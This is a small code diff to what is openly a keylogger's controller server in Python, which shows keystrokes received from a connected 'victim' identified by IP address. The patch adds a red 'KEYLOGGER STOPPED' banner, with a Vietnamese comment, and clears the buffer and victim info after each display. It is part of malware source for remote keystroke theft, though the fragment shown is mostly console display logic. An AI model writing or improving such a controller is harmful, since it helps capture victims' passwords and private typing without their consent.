@@ -89,7 +89,12 @@ class ConsoleMenu:
                     f"from ip address: {ip_victim}" + "\033[0m")
         else:
             print("\033[32m" + "No active victim connected." + "\033[0m")
-        print("\033[32m" + "Keystroke operation ->", buffer, "\033[0m")
+        if buffer == "[KEYLOGGER STOPPED]":
+            # in với màu đỏ nếu keylogger đã dừng
+            print()
+            print("\033[31m" + "★彡━━━━━★ [K E Y L O G G E R ★ S T O P P E D ] ★━━━━━彡★" + "\033[0m")
+        else:
+            print("\033[32m" + "Keystroke operation ->", buffer, "\033[0m")
 
 
 class ControllerServer:
@@ -203,7 +208,9 @@ class ControllerServer:
                         self.show_console()
                     else:
                         self.buffer = data_str
+                        self.info_victim = ""
                         self.show_console()
+                        self.buffer = ""
                 except socket.timeout as e:
                     continue
                 except json.JSONDecodeError as e:
